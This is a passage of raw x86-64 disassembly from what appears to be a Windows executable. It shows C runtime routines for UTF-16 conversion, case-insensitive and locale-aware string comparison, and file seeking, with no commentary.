   14000b889:	48 85 c0             	test   %rax,%rax
   14000b88c:	74 67                	je     0x14000b8f5
   14000b88e:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000b892:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000b898:	76 39                	jbe    0x14000b8d3
   14000b89a:	48 83 fd 01          	cmp    $0x1,%rbp
   14000b89e:	76 47                	jbe    0x14000b8e7
   14000b8a0:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000b8a6:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000b8ac:	8b c1                	mov    %ecx,%eax
   14000b8ae:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   14000b8b2:	c1 e8 0a             	shr    $0xa,%eax
   14000b8b5:	48 ff cd             	dec    %rbp
   14000b8b8:	66 41 0b c0          	or     %r8w,%ax
   14000b8bc:	66 89 03             	mov    %ax,(%rbx)
   14000b8bf:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000b8c4:	66 23 c8             	and    %ax,%cx
   14000b8c7:	48 83 c3 02          	add    $0x2,%rbx
   14000b8cb:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000b8d0:	66 0b c8             	or     %ax,%cx
   14000b8d3:	66 89 0b             	mov    %cx,(%rbx)
   14000b8d6:	48 03 fa             	add    %rdx,%rdi
   14000b8d9:	48 83 c3 02          	add    $0x2,%rbx
   14000b8dd:	48 83 ed 01          	sub    $0x1,%rbp
   14000b8e1:	0f 85 5f ff ff ff    	jne    0x14000b846
   14000b8e7:	49 2b df             	sub    %r15,%rbx
   14000b8ea:	49 89 3e             	mov    %rdi,(%r14)
   14000b8ed:	48 d1 fb             	sar    $1,%rbx
   14000b8f0:	48 8b c3             	mov    %rbx,%rax
   14000b8f3:	eb 1b                	jmp    0x14000b910
   14000b8f5:	49 8b fd             	mov    %r13,%rdi
   14000b8f8:	66 44 89 2b          	mov    %r13w,(%rbx)
   14000b8fc:	eb e9                	jmp    0x14000b8e7
   14000b8fe:	49 89 3e             	mov    %rdi,(%r14)
   14000b901:	e8 ba 9e ff ff       	call   0x1400057c0
   14000b906:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b90c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b910:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000b915:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000b91a:	48 83 c4 20          	add    $0x20,%rsp
   14000b91e:	41 5f                	pop    %r15
   14000b920:	41 5e                	pop    %r14
   14000b922:	41 5d                	pop    %r13
   14000b924:	41 5c                	pop    %r12
   14000b926:	5f                   	pop    %rdi
   14000b927:	c3                   	ret
   14000b928:	49 8b dd             	mov    %r13,%rbx
   14000b92b:	44 38 2f             	cmp    %r13b,(%rdi)
   14000b92e:	75 08                	jne    0x14000b938
   14000b930:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b936:	eb 1d                	jmp    0x14000b955
   14000b938:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000b93c:	75 08                	jne    0x14000b946
   14000b93e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b944:	eb 0f                	jmp    0x14000b955
   14000b946:	8a 47 02             	mov    0x2(%rdi),%al
   14000b949:	f6 d8                	neg    %al
   14000b94b:	4d 1b c0             	sbb    %r8,%r8
   14000b94e:	49 f7 d8             	neg    %r8
   14000b951:	49 83 c0 03          	add    $0x3,%r8
   14000b955:	4d 8b cc             	mov    %r12,%r9
   14000b958:	48 8b d7             	mov    %rdi,%rdx
   14000b95b:	33 c9                	xor    %ecx,%ecx
   14000b95d:	e8 36 07 00 00       	call   0x14000c098
   14000b962:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b966:	74 99                	je     0x14000b901
   14000b968:	48 85 c0             	test   %rax,%rax
   14000b96b:	74 83                	je     0x14000b8f0
   14000b96d:	48 83 f8 04          	cmp    $0x4,%rax
   14000b971:	75 03                	jne    0x14000b976
   14000b973:	48 ff c3             	inc    %rbx
   14000b976:	48 03 f8             	add    %rax,%rdi
   14000b979:	48 ff c3             	inc    %rbx
   14000b97c:	eb ad                	jmp    0x14000b92b
   14000b97e:	cc                   	int3
   14000b97f:	cc                   	int3
   14000b980:	33 c0                	xor    %eax,%eax
   14000b982:	38 01                	cmp    %al,(%rcx)
   14000b984:	74 0e                	je     0x14000b994
   14000b986:	48 3b c2             	cmp    %rdx,%rax
   14000b989:	74 09                	je     0x14000b994
   14000b98b:	48 ff c0             	inc    %rax
   14000b98e:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000b992:	75 f2                	jne    0x14000b986
   14000b994:	c3                   	ret
   14000b995:	cc                   	int3
   14000b996:	cc                   	int3
   14000b997:	cc                   	int3
   14000b998:	4c 8b da             	mov    %rdx,%r11
   14000b99b:	4c 8b d1             	mov    %rcx,%r10
   14000b99e:	4d 85 c0             	test   %r8,%r8
   14000b9a1:	75 03                	jne    0x14000b9a6
   14000b9a3:	33 c0                	xor    %eax,%eax
   14000b9a5:	c3                   	ret
   14000b9a6:	41 0f b6 0a          	movzbl (%r10),%ecx
   14000b9aa:	41 0f b6 13          	movzbl (%r11),%edx
   14000b9ae:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000b9b1:	83 f8 19             	cmp    $0x19,%eax
   14000b9b4:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000b9b8:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000b9bb:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000b9bf:	49 ff c2             	inc    %r10
   14000b9c2:	49 ff c3             	inc    %r11
   14000b9c5:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000b9c8:	83 f8 19             	cmp    $0x19,%eax
   14000b9cb:	41 8b c1             	mov    %r9d,%eax
   14000b9ce:	0f 47 ca             	cmova  %edx,%ecx
   14000b9d1:	2b c1                	sub    %ecx,%eax
   14000b9d3:	75 0b                	jne    0x14000b9e0
   14000b9d5:	45 85 c9             	test   %r9d,%r9d
   14000b9d8:	74 06                	je     0x14000b9e0
   14000b9da:	49 83 e8 01          	sub    $0x1,%r8
   14000b9de:	75 c6                	jne    0x14000b9a6
   14000b9e0:	c3                   	ret
   14000b9e1:	cc                   	int3
   14000b9e2:	cc                   	int3
   14000b9e3:	cc                   	int3
   14000b9e4:	48 83 ec 28          	sub    $0x28,%rsp
   14000b9e8:	83 3d b1 c3 00 00 00 	cmpl   $0x0,0xc3b1(%rip)        # 0x140017da0
   14000b9ef:	75 36                	jne    0x14000ba27
   14000b9f1:	48 85 c9             	test   %rcx,%rcx
   14000b9f4:	75 1a                	jne    0x14000ba10
   14000b9f6:	e8 c5 9d ff ff       	call   0x1400057c0
   14000b9fb:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000ba01:	e8 9a 9c ff ff       	call   0x1400056a0
   14000ba06:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000ba0b:	48 83 c4 28          	add    $0x28,%rsp
   14000ba0f:	c3                   	ret
   14000ba10:	48 85 d2             	test   %rdx,%rdx
   14000ba13:	74 e1                	je     0x14000b9f6
   14000ba15:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   14000ba1c:	77 d8                	ja     0x14000b9f6
   14000ba1e:	48 83 c4 28          	add    $0x28,%rsp
   14000ba22:	e9 71 ff ff ff       	jmp    0x14000b998
   14000ba27:	45 33 c9             	xor    %r9d,%r9d
   14000ba2a:	48 83 c4 28          	add    $0x28,%rsp
   14000ba2e:	e9 01 00 00 00       	jmp    0x14000ba34
   14000ba33:	cc                   	int3
   14000ba34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ba39:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000ba3e:	57                   	push   %rdi
   14000ba3f:	48 83 ec 40          	sub    $0x40,%rsp
   14000ba43:	49 8b d8             	mov    %r8,%rbx
   14000ba46:	48 8b fa             	mov    %rdx,%rdi
   14000ba49:	48 8b f1             	mov    %rcx,%rsi
   14000ba4c:	48 85 c9             	test   %rcx,%rcx
   14000ba4f:	75 17                	jne    0x14000ba68
   14000ba51:	e8 6a 9d ff ff       	call   0x1400057c0
   14000ba56:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000ba5c:	e8 3f 9c ff ff       	call   0x1400056a0
   14000ba61:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000ba66:	eb 69                	jmp    0x14000bad1
   14000ba68:	48 85 d2             	test   %rdx,%rdx
   14000ba6b:	74 e4                	je     0x14000ba51
   14000ba6d:	48 81 fb ff ff ff 7f 	cmp    $0x7fffffff,%rbx
   14000ba74:	77 db                	ja     0x14000ba51
   14000ba76:	48 85 db             	test   %rbx,%rbx
   14000ba79:	75 04                	jne    0x14000ba7f
   14000ba7b:	33 c0                	xor    %eax,%eax
   14000ba7d:	eb 52                	jmp    0x14000bad1
   14000ba7f:	49 8b d1             	mov    %r9,%rdx
   14000ba82:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000ba87:	e8 88 92 ff ff       	call   0x140004d14
   14000ba8c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000ba91:	4c 8b 80 10 01 00 00 	mov    0x110(%rax),%r8
   14000ba98:	0f b6 06             	movzbl (%rsi),%eax
   14000ba9b:	48 ff c6             	inc    %rsi
   14000ba9e:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   14000baa3:	0f b6 07             	movzbl (%rdi),%eax
   14000baa6:	48 ff c7             	inc    %rdi
   14000baa9:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   14000baae:	8b c2                	mov    %edx,%eax
   14000bab0:	2b c1                	sub    %ecx,%eax
   14000bab2:	75 0a                	jne    0x14000babe
   14000bab4:	85 d2                	test   %edx,%edx
   14000bab6:	74 06                	je     0x14000babe
   14000bab8:	48 83 eb 01          	sub    $0x1,%rbx
   14000babc:	75 da                	jne    0x14000ba98
   14000babe:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000bac3:	74 0c                	je     0x14000bad1
   14000bac5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000baca:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000bad1:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000bad6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000badb:	48 83 c4 40          	add    $0x40,%rsp
   14000badf:	5f                   	pop    %rdi
   14000bae0:	c3                   	ret
   14000bae1:	cc                   	int3
   14000bae2:	cc                   	int3
   14000bae3:	cc                   	int3
   14000bae4:	40 55                	rex push %rbp
   14000bae6:	53                   	push   %rbx
   14000bae7:	56                   	push   %rsi
   14000bae8:	57                   	push   %rdi
   14000bae9:	41 54                	push   %r12
   14000baeb:	41 55                	push   %r13
   14000baed:	41 56                	push   %r14
   14000baef:	41 57                	push   %r15
   14000baf1:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000baf8:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000bafd:	48 8b 05 24 b5 00 00 	mov    0xb524(%rip),%rax        # 0x140017028
   14000bb04:	48 33 c5             	xor    %rbp,%rax
   14000bb07:	48 89 45 28          	mov    %rax,0x28(%rbp)
   14000bb0b:	48 63 9d a0 00 00 00 	movslq 0xa0(%rbp),%rbx
   14000bb12:	45 33 e4             	xor    %r12d,%r12d
   14000bb15:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   14000bb1c:	4d 8b f9             	mov    %r9,%r15
   14000bb1f:	44 89 45 00          	mov    %r8d,0x0(%rbp)
   14000bb23:	48 8b f9             	mov    %rcx,%rdi
   14000bb26:	48 89 55 08          	mov    %rdx,0x8(%rbp)
   14000bb2a:	85 db                	test   %ebx,%ebx
   14000bb2c:	7e 10                	jle    0x14000bb3e
   14000bb2e:	48 8b d3             	mov    %rbx,%rdx
   14000bb31:	49 8b c9             	mov    %r9,%rcx
   14000bb34:	e8 47 fe ff ff       	call   0x14000b980
   14000bb39:	48 8b d8             	mov    %rax,%rbx
   14000bb3c:	eb 09                	jmp    0x14000bb47
   14000bb3e:	83 fb ff             	cmp    $0xffffffff,%ebx
   14000bb41:	0f 8c db 02 00 00    	jl     0x14000be22
   14000bb47:	48 63 b5 b0 00 00 00 	movslq 0xb0(%rbp),%rsi
   14000bb4e:	85 f6                	test   %esi,%esi
   14000bb50:	7e 10                	jle    0x14000bb62
   14000bb52:	48 8b d6             	mov    %rsi,%rdx
   14000bb55:	49 8b cd             	mov    %r13,%rcx
   14000bb58:	e8 23 fe ff ff       	call   0x14000b980
   14000bb5d:	48 8b f0             	mov    %rax,%rsi
   14000bb60:	eb 09                	jmp    0x14000bb6b
   14000bb62:	83 fe ff             	cmp    $0xffffffff,%esi
   14000bb65:	0f 8c b7 02 00 00    	jl     0x14000be22
   14000bb6b:	44 8b b5 b8 00 00 00 	mov    0xb8(%rbp),%r14d
   14000bb72:	45 85 f6             	test   %r14d,%r14d
   14000bb75:	75 07                	jne    0x14000bb7e
   14000bb77:	48 8b 07             	mov    (%rdi),%rax
   14000bb7a:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000bb7e:	85 db                	test   %ebx,%ebx
   14000bb80:	74 08                	je     0x14000bb8a
   14000bb82:	85 f6                	test   %esi,%esi
   14000bb84:	0f 85 a6 00 00 00    	jne    0x14000bc30
   14000bb8a:	3b de                	cmp    %esi,%ebx
   14000bb8c:	0f 84 89 02 00 00    	je     0x14000be1b
   14000bb92:	83 fe 01             	cmp    $0x1,%esi
   14000bb95:	0f 8f 8b 00 00 00    	jg     0x14000bc26
   14000bb9b:	83 fb 01             	cmp    $0x1,%ebx
   14000bb9e:	7f 48                	jg     0x14000bbe8
   14000bba0:	48 8d 55 10          	lea    0x10(%rbp),%rdx
   14000bba4:	41 8b ce             	mov    %r14d,%ecx
   14000bba7:	ff 15 d3 25 00 00    	call   *0x25d3(%rip)        # 0x14000e180
   14000bbad:	85 c0                	test   %eax,%eax
   14000bbaf:	0f 84 6d 02 00 00    	je     0x14000be22
   14000bbb5:	85 db                	test   %ebx,%ebx
   14000bbb7:	7e 39                	jle    0x14000bbf2
   14000bbb9:	83 7d 10 02          	cmpl   $0x2,0x10(%rbp)
   14000bbbd:	72 29                	jb     0x14000bbe8
   14000bbbf:	48 8d 45 16          	lea    0x16(%rbp),%rax
   14000bbc3:	44 38 65 16          	cmp    %r12b,0x16(%rbp)
   14000bbc7:	74 1f                	je     0x14000bbe8
   14000bbc9:	44 38 60 01          	cmp    %r12b,0x1(%rax)
   14000bbcd:	74 19                	je     0x14000bbe8
   14000bbcf:	41 8a 0f             	mov    (%r15),%cl
   14000bbd2:	3a 08                	cmp    (%rax),%cl
   14000bbd4:	72 09                	jb     0x14000bbdf
   14000bbd6:	3a 48 01             	cmp    0x1(%rax),%cl
   14000bbd9:	0f 86 3c 02 00 00    	jbe    0x14000be1b
   14000bbdf:	48 83 c0 02          	add    $0x2,%rax
   14000bbe3:	44 38 20             	cmp    %r12b,(%rax)
   14000bbe6:	75 e1                	jne    0x14000bbc9
   14000bbe8:	b8 03 00 00 00       	mov    $0x3,%eax
   14000bbed:	e9 32 02 00 00       	jmp    0x14000be24
   14000bbf2:	85 f6                	test   %esi,%esi
   14000bbf4:	7e 3a                	jle    0x14000bc30
   14000bbf6:	83 7d 10 02          	cmpl   $0x2,0x10(%rbp)
   14000bbfa:	72 2a                	jb     0x14000bc26
   14000bbfc:	48 8d 45 16          	lea    0x16(%rbp),%rax
   14000bc00:	44 38 65 16          	cmp    %r12b,0x16(%rbp)
   14000bc04:	74 20                	je     0x14000bc26
   14000bc06:	44 38 60 01          	cmp    %r12b,0x1(%rax)
   14000bc0a:	74 1a                	je     0x14000bc26
   14000bc0c:	41 8a 4d 00          	mov    0x0(%r13),%cl
   14000bc10:	3a 08                	cmp    (%rax),%cl
   14000bc12:	72 09                	jb     0x14000bc1d
   14000bc14:	3a 48 01             	cmp    0x1(%rax),%cl
   14000bc17:	0f 86 fe 01 00 00    	jbe    0x14000be1b
   14000bc1d:	48 83 c0 02          	add    $0x2,%rax
   14000bc21:	44 38 20             	cmp    %r12b,(%rax)
   14000bc24:	75 e0                	jne    0x14000bc06
   14000bc26:	b8 01 00 00 00       	mov    $0x1,%eax
   14000bc2b:	e9 f4 01 00 00       	jmp    0x14000be24
   14000bc30:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000bc35:	44 8b cb             	mov    %ebx,%r9d
   14000bc38:	4d 8b c7             	mov    %r15,%r8
   14000bc3b:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000bc40:	ba 09 00 00 00       	mov    $0x9,%edx
   14000bc45:	41 8b ce             	mov    %r14d,%ecx
   14000bc48:	e8 2f b3 ff ff       	call   0x140006f7c
   14000bc4d:	4c 63 e0             	movslq %eax,%r12
   14000bc50:	85 c0                	test   %eax,%eax
   14000bc52:	0f 84 ca 01 00 00    	je     0x14000be22
   14000bc58:	49 8b cc             	mov    %r12,%rcx
   14000bc5b:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000bc62:	ff ff 0f 
   14000bc65:	48 03 c9             	add    %rcx,%rcx
   14000bc68:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   14000bc6c:	48 3b ca             	cmp    %rdx,%rcx
   14000bc6f:	48 1b c9             	sbb    %rcx,%rcx
   14000bc72:	48 23 ca             	and    %rdx,%rcx
   14000bc75:	74 50                	je     0x14000bcc7
   14000bc77:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000bc7e:	77 2e                	ja     0x14000bcae
   14000bc80:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000bc84:	48 3b c1             	cmp    %rcx,%rax
   14000bc87:	77 03                	ja     0x14000bc8c
   14000bc89:	49 8b c0             	mov    %r8,%rax
   14000bc8c:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bc90:	e8 fb 1a 00 00       	call   0x14000d790
   14000bc95:	48 2b e0             	sub    %rax,%rsp
   14000bc98:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   14000bc9d:	48 85 ff             	test   %rdi,%rdi
   14000bca0:	0f 84 59 01 00 00    	je     0x14000bdff
   14000bca6:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000bcac:	eb 13                	jmp    0x14000bcc1
   14000bcae:	e8 9d c2 ff ff       	call   0x140007f50
   14000bcb3:	48 8b f8             	mov    %rax,%rdi
   14000bcb6:	48 85 c0             	test   %rax,%rax
   14000bcb9:	74 0e                	je     0x14000bcc9
   14000bcbb:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bcc1:	48 83 c7 10          	add    $0x10,%rdi
   14000bcc5:	eb 02                	jmp    0x14000bcc9
   14000bcc7:	33 ff                	xor    %edi,%edi
   14000bcc9:	48 85 ff             	test   %rdi,%rdi
   14000bccc:	0f 84 2d 01 00 00    	je     0x14000bdff
   14000bcd2:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000bcd7:	44 8b cb             	mov    %ebx,%r9d
   14000bcda:	4d 8b c7             	mov    %r15,%r8
   14000bcdd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000bce2:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bce7:	41 8b ce             	mov    %r14d,%ecx
   14000bcea:	e8 8d b2 ff ff       	call   0x140006f7c
   14000bcef:	85 c0                	test   %eax,%eax
   14000bcf1:	0f 84 08 01 00 00    	je     0x14000bdff
   14000bcf7:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000bcfc:	44 8b ce             	mov    %esi,%r9d
   14000bcff:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bd05:	4d 8b c5             	mov    %r13,%r8
   14000bd08:	ba 09 00 00 00       	mov    $0x9,%edx
   14000bd0d:	41 8b ce             	mov    %r14d,%ecx
   14000bd10:	e8 67 b2 ff ff       	call   0x140006f7c
   14000bd15:	4c 63 f8             	movslq %eax,%r15
   14000bd18:	85 c0                	test   %eax,%eax
   14000bd1a:	0f 84 df 00 00 00    	je     0x14000bdff
   14000bd20:	49 8b d7             	mov    %r15,%rdx
   14000bd23:	48 03 d2             	add    %rdx,%rdx
   14000bd26:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   14000bd2a:	48 3b d1             	cmp    %rcx,%rdx
   14000bd2d:	48 1b d2             	sbb    %rdx,%rdx
   14000bd30:	48 23 d1             	and    %rcx,%rdx
   14000bd33:	74 56                	je     0x14000bd8b
   14000bd35:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   14000bd3c:	77 31                	ja     0x14000bd6f
   14000bd3e:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   14000bd42:	48 3b c2             	cmp    %rdx,%rax
   14000bd45:	77 0a                	ja     0x14000bd51
   14000bd47:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000bd4e:	ff ff 0f 
   14000bd51:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bd55:	e8 36 1a 00 00       	call   0x14000d790
   14000bd5a:	48 2b e0             	sub    %rax,%rsp
   14000bd5d:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000bd62:	48 85 db             	test   %rbx,%rbx
   14000bd65:	74 7e                	je     0x14000bde5
   14000bd67:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000bd6d:	eb 16                	jmp    0x14000bd85
   14000bd6f:	48 8b ca             	mov    %rdx,%rcx
   14000bd72:	e8 d9 c1 ff ff       	call   0x140007f50
   14000bd77:	48 8b d8             	mov    %rax,%rbx
   14000bd7a:	48 85 c0             	test   %rax,%rax
   14000bd7d:	74 0e                	je     0x14000bd8d
   14000bd7f:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bd85:	48 83 c3 10          	add    $0x10,%rbx
   14000bd89:	eb 02                	jmp    0x14000bd8d
   14000bd8b:	33 db                	xor    %ebx,%ebx
   14000bd8d:	48 85 db             	test   %rbx,%rbx
   14000bd90:	74 53                	je     0x14000bde5
   14000bd92:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000bd97:	44 8b ce             	mov    %esi,%r9d
   14000bd9a:	4d 8b c5             	mov    %r13,%r8
   14000bd9d:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bda2:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bda7:	41 8b ce             	mov    %r14d,%ecx
   14000bdaa:	e8 cd b1 ff ff       	call   0x140006f7c
   14000bdaf:	85 c0                	test   %eax,%eax
   14000bdb1:	74 32                	je     0x14000bde5
   14000bdb3:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000bdb9:	45 8b cc             	mov    %r12d,%r9d
   14000bdbc:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000bdc2:	4c 8b c7             	mov    %rdi,%r8
   14000bdc5:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bdcb:	8b 55 00             	mov    0x0(%rbp),%edx
   14000bdce:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000bdd2:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000bdd7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bddc:	e8 cf c9 ff ff       	call   0x1400087b0
   14000bde1:	8b f0                	mov    %eax,%esi
   14000bde3:	eb 02                	jmp    0x14000bde7
   14000bde5:	33 f6                	xor    %esi,%esi
   14000bde7:	48 85 db             	test   %rbx,%rbx
   14000bdea:	74 15                	je     0x14000be01
   14000bdec:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000bdf0:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bdf6:	75 09                	jne    0x14000be01
   14000bdf8:	e8 5b 9a ff ff       	call   0x140005858
   14000bdfd:	eb 02                	jmp    0x14000be01
   14000bdff:	33 f6                	xor    %esi,%esi
   14000be01:	48 85 ff             	test   %rdi,%rdi
   14000be04:	74 11                	je     0x14000be17
   14000be06:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000be0a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000be10:	75 05                	jne    0x14000be17
   14000be12:	e8 41 9a ff ff       	call   0x140005858
   14000be17:	8b c6                	mov    %esi,%eax
   14000be19:	eb 09                	jmp    0x14000be24
   14000be1b:	b8 02 00 00 00       	mov    $0x2,%eax
   14000be20:	eb 02                	jmp    0x14000be24
   14000be22:	33 c0                	xor    %eax,%eax
   14000be24:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000be28:	48 33 cd             	xor    %rbp,%rcx
   14000be2b:	e8 c0 15 00 00       	call   0x14000d3f0
   14000be30:	48 8d 65 38          	lea    0x38(%rbp),%rsp
   14000be34:	41 5f                	pop    %r15
   14000be36:	41 5e                	pop    %r14
   14000be38:	41 5d                	pop    %r13
   14000be3a:	41 5c                	pop    %r12
   14000be3c:	5f                   	pop    %rdi
   14000be3d:	5e                   	pop    %rsi
   14000be3e:	5b                   	pop    %rbx
   14000be3f:	5d                   	pop    %rbp
   14000be40:	c3                   	ret
   14000be41:	cc                   	int3
   14000be42:	cc                   	int3
   14000be43:	cc                   	int3
   14000be44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000be49:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000be4e:	57                   	push   %rdi
   14000be4f:	48 83 ec 60          	sub    $0x60,%rsp
   14000be53:	48 8b f2             	mov    %rdx,%rsi
   14000be56:	49 8b d9             	mov    %r9,%rbx
   14000be59:	48 8b d1             	mov    %rcx,%rdx
   14000be5c:	41 8b f8             	mov    %r8d,%edi
   14000be5f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000be64:	e8 ab 8e ff ff       	call   0x140004d14
   14000be69:	8b 84 24 a8 00 00 00 	mov    0xa8(%rsp),%eax
   14000be70:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000be75:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000be79:	4c 8b cb             	mov    %rbx,%r9
   14000be7c:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000be83:	44 8b c7             	mov    %edi,%r8d
   14000be86:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000be8a:	48 8b d6             	mov    %rsi,%rdx
   14000be8d:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   14000be94:	00 
   14000be95:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000be9a:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   14000bea1:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000bea5:	e8 3a fc ff ff       	call   0x14000bae4
   14000beaa:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000beaf:	74 0c                	je     0x14000bebd
   14000beb1:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000beb6:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000bebd:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000bec2:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000bec7:	48 83 c4 60          	add    $0x60,%rsp
   14000becb:	5f                   	pop    %rdi
   14000becc:	c3                   	ret
   14000becd:	cc                   	int3
   14000bece:	cc                   	int3
   14000becf:	cc                   	int3
   14000bed0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bed5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000beda:	57                   	push   %rdi
   14000bedb:	48 83 ec 20          	sub    $0x20,%rsp
   14000bedf:	48 63 d9             	movslq %ecx,%rbx
   14000bee2:	41 8b f8             	mov    %r8d,%edi
   14000bee5:	8b cb                	mov    %ebx,%ecx
   14000bee7:	48 8b f2             	mov    %rdx,%rsi
   14000beea:	e8 4d ba ff ff       	call   0x14000793c
   14000beef:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000bef3:	75 11                	jne    0x14000bf06
   14000bef5:	e8 c6 98 ff ff       	call   0x1400057c0
   14000befa:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000bf00:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000bf04:	eb 53                	jmp    0x14000bf59
   14000bf06:	44 8b cf             	mov    %edi,%r9d
   14000bf09:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000bf0e:	48 8b d6             	mov    %rsi,%rdx
   14000bf11:	48 8b c8             	mov    %rax,%rcx
   14000bf14:	ff 15 ee 22 00 00    	call   *0x22ee(%rip)        # 0x14000e208
   14000bf1a:	85 c0                	test   %eax,%eax
   14000bf1c:	75 0f                	jne    0x14000bf2d
   14000bf1e:	ff 15 6c 21 00 00    	call   *0x216c(%rip)        # 0x14000e090
   14000bf24:	8b c8                	mov    %eax,%ecx
   14000bf26:	e8 25 98 ff ff       	call   0x140005750
   14000bf2b:	eb d3                	jmp    0x14000bf00
   14000bf2d:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000bf32:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000bf36:	74 c8                	je     0x14000bf00
   14000bf38:	48 8b d3             	mov    %rbx,%rdx
   14000bf3b:	4c 8d 05 0e c1 00 00 	lea    0xc10e(%rip),%r8        # 0x140018050
   14000bf42:	83 e2 3f             	and    $0x3f,%edx
   14000bf45:	48 8b cb             	mov    %rbx,%rcx
